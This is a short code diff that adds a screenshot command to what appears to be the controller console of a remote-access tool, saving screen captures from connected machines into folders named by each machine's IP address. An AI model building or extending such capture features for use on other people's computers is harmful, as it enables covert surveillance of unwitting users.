@@ -454,3 +454,22 @@ class COMMCENTER:
                 print(result)
         else:
             pull.error("You need to connect before execute this command")
+
+    def c_screenshot(self):
+        if self.CURRENT:
+            self.CURRENT[1].send_data("screenshot:")
+            result = self.CURRENT[1].recv_data()
+            dirname = os.path.dirname(__file__)
+            dirname = os.path.join( dirname, 'screenshots' )
+            if not os.path.isdir(dirname):
+                os.mkdir(dirname)
+            dirname = os.path.join( dirname, '%s' % (self.CURRENT[1].ip) )
+            if not os.path.isdir(dirname):
+                os.mkdir(dirname)
+            fullpath = os.path.join( dirname, datetime.now().strftime("%d-%m-%Y %H:%M:%S.png") )
+            fl = open( fullpath, 'wb' )
+            fl.write( result )
+            fl.close()
+            pull.print("Saved: [" + pull.DARKCYAN + fullpath + pull.END + "]")
+        else:
+            pull.error("You need to connect before execute this command!")
